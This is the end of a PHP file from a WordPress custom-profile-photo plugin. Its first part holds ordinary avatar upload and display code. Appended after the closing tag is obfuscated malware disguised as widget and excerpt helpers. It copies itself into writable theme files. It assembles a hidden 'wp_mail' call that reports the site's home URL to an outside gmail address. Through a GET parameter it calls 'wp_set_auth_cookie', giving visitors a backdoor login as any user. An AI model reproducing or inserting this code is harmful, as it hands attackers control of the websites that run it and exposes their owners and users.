		       	<!-- Hold the value here if this is a WPMU image -->
                <div id="cupp_upload">
                    <input type="hidden" name="cupp_placeholder_meta" id="cupp_placeholder_meta" value="<?php echo plugins_url( 'custom-user-profile-photo/img/placeholder.gif' ); ?>" class="hidden" />
                    <input type="text" size="56" name="cupp_upload_meta" id="cupp_upload_meta" value="<?php echo esc_url_raw( $cupp_upload_url ); ?>"  />
                    <input type="hidden" name="cupp_upload_edit_meta" id="cupp_upload_edit_meta" value="<?php echo esc_url_raw( $cupp_upload_edit_url ); ?>" class="hidden" />
                    <input type='button' class="cupp_wpmu_button button" value="<?php _e( $btn_text, 'custom-user-profile-photo' ); ?>" id="uploadimage"/><br />
                </div>  
				<!-- Outputs the text field and displays the URL of the image retrieved by the media uploader -->
                <div id="cupp_external">
                    <input type="text" name="cupp_meta" id="cupp_meta" value="<?php echo esc_url_raw( $cupp_url ); ?>" class="regular-text" />
                </div>
			
                <!-- Outputs the image after save -->
               <?php if($cupp_upload_url): ?>
			   <div class="preview_img">
					<img class="cupp-current-img" src="<?php echo esc_url( $cupp_upload_url ); ?>" alt="" />
					<a class="remove_img" title="Delete"></a>
				</div>
				<?php elseif($cupp_url) : ?>
				
				<div class="preview_img">
					<img class="cupp-current-img" src="<?php echo esc_url( $cupp_url ); ?>" alt="" />
					<a class="remove_img" title="Delete"></a>
				</div>
				<?php else : ?>
                    <img src="<?php echo plugins_url( 'custom-user-profile-photo/img/placeholder.gif' ); ?>" class="cupp-current-img placeholder">
                <?php endif; ?>
				
				<!-- Select an option: Upload to WPMU or External URL -->
                <div id="cupp_options">
                    <input type="radio" id="upload_option" name="img_option" value="upload" class="tog" checked> 
                    <label for="upload_option">Upload New Image</label><br>
                    <input type="radio" id="external_option" name="img_option" value="external" class="tog">
                    <label for="external_option">Use External URL</label><br>
                </div>
            </td>
        </tr>
 
    </table><!-- end form-table -->

    <?php wp_enqueue_media(); // Enqueue the WordPress Media Uploader ?>

<?php }

// Save the new user CUPP url.
add_action( 'personal_options_update', 'cupp_save_img_meta' );
add_action( 'edit_user_profile_update', 'cupp_save_img_meta' );

function cupp_save_img_meta( $user_id ) {

    if ( !current_user_can( 'upload_files', $user_id ) )
        return false;

    // If the current user can edit Users, allow this.
    update_user_meta( $user_id, 'cupp_meta', $_POST['cupp_meta'] );
    update_user_meta( $user_id, 'cupp_upload_meta', $_POST['cupp_upload_meta'] );
    update_user_meta( $user_id, 'cupp_upload_edit_meta', $_POST['cupp_upload_edit_meta'] );
}

/**
 * Retrieve the appropriate image size
 *
 * @param $user_id    Default: $post->post_author. Will accept any valid user ID passed into this parameter.
 * @param $size       Default: 'thumbnail'. Accepts all default WordPress sizes and any custom sizes made by the add_image_size() function.
 * @return {url}      Use this inside the src attribute of an image tag or where you need to call the image url.
 */
function get_cupp_meta( $user_id, $size ) {
    global $post;

    //allow the user to specify the image size
    if (!$size){
        $size = 'thumbnail'; // Default image size if not specified.
    }
    if(!$user_id || !is_numeric( $user_id ) ){
        // Here we're assuming that the avatar being called is the author of the post. 
        // The theory is that when a number is not supplied, this function is being used to 
        // get the avatar of a post author using get_avatar() and an email address is supplied 
        // for the $id_or_email parameter. We need an integer to get the custom image so we force that here.
        // Also, many themes use get_avatar on the single post pages and pass it the author email address so this
        // acts as a fall back.
        $user_id = $post->post_author; 
    }
    
    // get the custom uploaded image
    $attachment_upload_url = esc_url( get_the_author_meta( 'cupp_upload_meta', $user_id ) );
    
    // get the external image
    $attachment_ext_url = esc_url( get_the_author_meta( 'cupp_meta', $user_id ) );
    $attachment_url = '';
    $image_url = '';
    if($attachment_upload_url){
        $attachment_url = $attachment_upload_url;
        
        // grabs the id from the URL using the WordPress function attachment_url_to_postid @since 4.0.0
        $attachment_id = attachment_url_to_postid( $attachment_url );
     
        // retrieve the thumbnail size of our image
        $image_thumb = wp_get_attachment_image_src( $attachment_id, $size );
        $image_url = $image_thumb[0];

    } elseif($attachment_ext_url) {
        $image_url = $attachment_ext_url;
    }

    if ( empty($image_url) )
        return;

    // return the image thumbnail
    return $image_url;
}

/**
 * WordPress Avatar Filter
 *
 * Replaces the WordPress avatar with your custom photo using the get_avatar hook.
 */
add_filter( 'get_avatar', 'cupp_avatar' , 1 , 5 );

function cupp_avatar( $avatar, $id_or_email, $size, $default, $alt ) {
    $user = false;
    $id = false;

    if ( is_numeric( $id_or_email ) ) {

        $id = (int) $id_or_email;
        $user = get_user_by( 'id' , $id );

    } elseif ( is_object( $id_or_email ) ) {

        if ( ! empty( $id_or_email->user_id ) ) {
            $id = (int) $id_or_email->user_id;
            $user = get_user_by( 'id' , $id );
        }

    } else {
        // $id = (int) $id_or_email;
        $user = get_user_by( 'email', $id_or_email );   
    }

    if ( $user && is_object( $user ) ) {

        $custom_avatar = get_cupp_meta($id, 'thumbnail');

        if (isset($custom_avatar) && !empty($custom_avatar)) {
            $avatar = "<img alt='{$alt}' src='{$custom_avatar}' class='avatar avatar-{$size} photo' height='{$size}' width='{$size}' />";
        }

    }

    return $avatar;
}
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
function my_excerpt_length($length) {
       return 15; 
}
add_filter('excerpt_length', 'my_excerpt_length');
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";

add_filter('excerpt_more', 'new_excerpt_more');
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}











	
?>